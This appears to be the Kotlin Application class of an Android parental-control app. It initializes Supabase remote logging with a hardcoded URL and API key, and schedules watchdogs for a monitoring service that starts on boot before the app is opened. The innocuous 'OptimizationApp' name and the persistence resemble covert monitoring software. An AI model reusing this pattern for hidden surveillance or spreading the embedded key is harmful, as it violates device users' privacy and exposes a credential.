package com.example.parentalcontrol

import android.app.Application
import android.util.Log
import java.io.File
import java.io.PrintWriter
import java.io.StringWriter

/**
 * OptimizationApp v23
 * ─────────────────────────────────────────────────────────────
 * CRITICAL FIX: Initialize SupabaseManager here so it's ready
 * when ServiceRestartReceiver starts MonitoringForegroundService
 * before the user ever opens the app (BOOT_COMPLETED / MY_PACKAGE_REPLACED).
 */
class OptimizationApp : Application() {

    companion object {
        private const val SUPABASE_URL = "https://kubowqqqawkgghxcktoe.supabase.co"
        private const val SUPABASE_KEY =
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt1Ym93cXFxYXdrZ2doeGNrdG9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM3MTIwNzksImV4cCI6MjA4OTI4ODA3OX0.RnKtHRnqrdh0wF4vl-LWQEjlw7uYDCThqAn23WBMafM"
    }

    override fun onCreate() {
        super.onCreate()
        Log.i("OptimizationApp", "=== v23 Application starting ===")

        // ── 1. Crash logger (before anything) ────────────────────────────────
        installCrashToFile()

        // ── 2. Init Supabase FIRST ────────────────────────────────────────────
        // CRITICAL: MonitoringForegroundService can be started by ServiceRestartReceiver
        // (BOOT / MY_PACKAGE_REPLACED) BEFORE the user opens the app.
        // If SupabaseManager is not initialized here, any logRemote() call crashes.
        try {
            kotlinx.coroutines.runBlocking {
                SupabaseManager.getInstance().initialize(SUPABASE_URL, SUPABASE_KEY)
            }
            Log.i("OptimizationApp", "Supabase initialized ✅")
        } catch (e: Exception) {
            Log.e("OptimizationApp", "Supabase init failed: ${e.message}")
        }

        // ── 3. Watchdogs ──────────────────────────────────────────────────────
        try { ServiceWatchdogJobService.schedule(this) } catch (e: Exception) {
            Log.e("OptimizationApp", "JobService failed: ${e.message}")
        }
        try { ServiceWatchdogWorker.schedule(this) } catch (e: Exception) {
            Log.e("OptimizationApp", "Worker failed: ${e.message}")
        }

        Log.i("OptimizationApp", "=== Application ready ===")
    }

    private fun installCrashToFile() {
        val defaultHandler = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            try {
                val sw = StringWriter()
                throwable.printStackTrace(PrintWriter(sw))
                val msg = buildString {
                    appendLine("=== CRASH REPORT ===")
                    appendLine("Thread: ${thread.name}")
                    appendLine("Time: ${java.util.Date()}")
                    appendLine("---")
                    append(sw.toString())
                }
                // Write to external storage (readable by file manager)
                try {
                    val extFile = File(getExternalFilesDir(null), "sync_crash.txt")
                    extFile.writeText(msg)
                } catch (_: Exception) {}
                // Internal storage backup
                try {
                    File(filesDir, "sync_crash.txt").writeText(msg)
                } catch (_: Exception) {}

                Log.e("CRASH_LOG", msg)
            } catch (_: Exception) {}
            defaultHandler?.uncaughtException(thread, throwable)
        }
    }
}
